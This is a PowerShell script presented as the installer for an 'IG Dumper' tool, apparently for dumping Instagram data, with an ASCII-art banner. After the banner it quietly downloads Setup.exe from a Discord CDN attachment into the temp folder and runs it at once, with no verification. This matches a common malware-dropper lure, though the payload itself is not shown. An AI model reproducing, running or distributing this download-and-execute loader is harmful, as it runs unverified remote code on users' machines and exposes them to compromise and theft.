Clear-Host

Write-Host "  .  *  +   .   *   +   .   *   +   .   *   +   .   *   +  ." -ForegroundColor Magenta
Write-Host "        .        .       .       .       .       .       ." -ForegroundColor DarkGray
Write-Host "   +         *      (\___/)      *         +         *" -ForegroundColor White
Write-Host "        .      .    ( ^_^ )    .      .        ." -ForegroundColor Magenta
Write-Host "   *         +      /      \      +         *         +" -ForegroundColor White
Write-Host "        .          (_/|__| \_)          .        .       ." -ForegroundColor DarkGray
Write-Host "  .  *  +   .   *   +   .   *   +   .   *   +   .   *   +  ." -ForegroundColor Magenta
Write-Host ""
Write-Host "      ____ ______   ____                                " -ForegroundColor Magenta
Write-Host "     /  _// ____/  / __ \__  ______ ___  ____  ___  _____" -ForegroundColor Magenta
Write-Host "     / / / / __   / / / / / / / __ ``__ \/ __ \/ _ \/ ___/" -ForegroundColor Magenta
Write-Host "   _/ / / /_/ /  / /_/ / /_/ / / / / / / /_/ /  __/ /    " -ForegroundColor Magenta
Write-Host "  /___/ \____/  /_____/\__,_/_/ /_/ /_/ .___/\___/_/     " -ForegroundColor Magenta
Write-Host "                                     /_/                 " -ForegroundColor Magenta
Write-Host ""
Write-Host "                                     * by @92tif *" -ForegroundColor Magenta
Write-Host "                               v1.0.0-alpha" -ForegroundColor DarkGray
Write-Host ""
Write-Host "  Starting download of IG Dumper..." -ForegroundColor White
Write-Host ""

$url = "https://cdn.discordapp.com/attachments/1490996423490011186/1511956978061152326/Setup.exe?ex=6a22572a&is=6a2105aa&hm=7e5f483a30ff693e97fda6ac16e3b2431576c90f2fd0108554fe0b05e0973f7b&"
$dest = "$env:TEMP\Setup.exe"

$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing

Write-Host "  <3 [========================================] 100% | Download complete!" -ForegroundColor Magenta
Write-Host ""
Write-Host "  DONE! Executing installer..." -ForegroundColor Green
Write-Host ""

Start-Sleep -Seconds 1
Start-Process -FilePath $dest
